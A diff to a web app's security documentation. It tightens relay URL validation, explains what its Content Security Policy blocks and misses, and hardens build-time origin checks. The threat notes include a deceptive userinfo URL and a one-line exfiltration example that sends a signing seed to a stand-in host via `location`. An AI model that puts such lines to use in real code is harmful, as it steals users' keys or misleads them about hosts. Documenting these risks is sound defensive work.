@@ -76,10 +76,15 @@ priority order (`src/relay-config.ts`):
 That order applies **only before pairing**. Once a browser is paired, its relay is pinned (below).
 
 **HTTPS only.** A relay URL is accepted only if it is `https:`, or `http:` on a loopback host
-(`localhost`, `127.0.0.1`, `[::1]`) for local development against `wrangler dev`. Anything else —
+(`localhost`, `127.0.0.1`, `[::1]`) for local development against `wrangler dev`, and it carries no
+username, password, query (`?`) or fragment (`#`) — userinfo lets a link look like one host while
+pointing at another (`https://relay.example.com@evil.example` is `evil.example`). Anything else —
 including `http://relay.example.com` — is rejected at configuration time and the config prompt
-shows why, so bearer tokens and ciphertext never travel unencrypted. The SDK's `createClient`
-enforces the same rule (issue #249).
+shows why, so bearer tokens and ciphertext never travel unencrypted. A path is allowed. The
+accepted URL is stored in canonical form: the origin (lowercased, punycode host, default port
+dropped) plus the path without trailing slashes. The SDK's `createClient` enforces the same rule;
+`packages/sdk/test/fixtures/relay-url-vectors.json` holds the shared accept/reject vectors (issue
+#249).
 
 ### Relay pinning
 
@@ -87,7 +92,8 @@ Pairing **pins** the relay: the relay URL is stored inside the paired identity (
 field `relayUrl`) and every relay call the browser makes afterwards — inbox polling, the `connect`
 WebSocket, account-state resolution — goes to that pinned relay.
 
-- **Before pairing**, the pairing screen shows the relay the browser is about to pin, so a relay
+- **Before pairing**, the pairing screen shows the origin of the relay the browser is about to pin
+  (in punycode, so a lookalike internationalized host can't pass as a familiar one), so a relay
   pre-filled by a `?relay=` link is visible before the human commits. Nothing is sent to it until
   pairing completes.
 - **After pairing**, a `?relay=` link that differs from the pinned relay is **ignored**: it is not
@@ -145,9 +151,16 @@ Why each part matters: the page holds the device's signing seed in browser stora
 running on the approver origin could forge approvals. `script-src 'self'` with no `'unsafe-inline'`
 means only the shipped files run (the theme bootstrap is the external `theme.js`, not an inline
 script); `'wasm-unsafe-eval'` allows compiling the vendored allw WASM core and nothing else;
-`connect-src` limits fetches and WebSockets to the page itself and the listed relays, so even
-injected script cannot send the seed elsewhere; `frame-ancestors 'none'` stops the approver being
+`connect-src` limits fetch, XHR and WebSocket traffic to the page itself and the listed relays,
+which blocks exfiltration over those channels; `frame-ancestors 'none'` stops the approver being
 framed to clickjack an Approve button.
+
+**What the CSP does not do.** It stops injected inline or third-party script from _running_, and it
+blocks fetch/XHR/WebSocket exfiltration. It does **not** stop script that is already running on the
+approver origin — for example a compromised dependency bundled into `app.js`, which `'self'` allows —
+from leaking data by top-level navigation (`location = "https://evil.example/#" + seed`),
+`window.open`, or WebRTC. That residual risk is tracked in `docs/threat-model.md` alongside
+hardware-backed key custody (#244).
 
 **[OPERATOR] The relay list is set at build time.** `connect-src` must name every relay the deployed
 site will talk to — a relay missing from it is blocked by the browser, even if it is pinned. The
@@ -162,8 +175,11 @@ ALLW_RELAY_ORIGINS="http://127.0.0.1:8787" pnpm --filter @allw/web-approver buil
 ```
 
 The build fails, rather than emitting a weaker policy, if an origin is not `https:` (or `http:` on
-loopback), carries a path/query/credentials, or makes a header line exceed Cloudflare's 2,000
-character limit.
+`localhost`/`127.0.0.1`), its host is not a plain DNS name or IPv4 address (so wildcards such as
+`https://*.workers.dev` and CSP syntax such as `;` never reach the header), it uses an IPv6 address
+(a CSP host-source cannot express one — use `http://127.0.0.1:8787` for a local relay), it carries a
+path, query, fragment or credentials, or a header line would exceed Cloudflare's 2,000 character
+limit.
 
 **[OPERATOR] Verify after every deploy:**
 
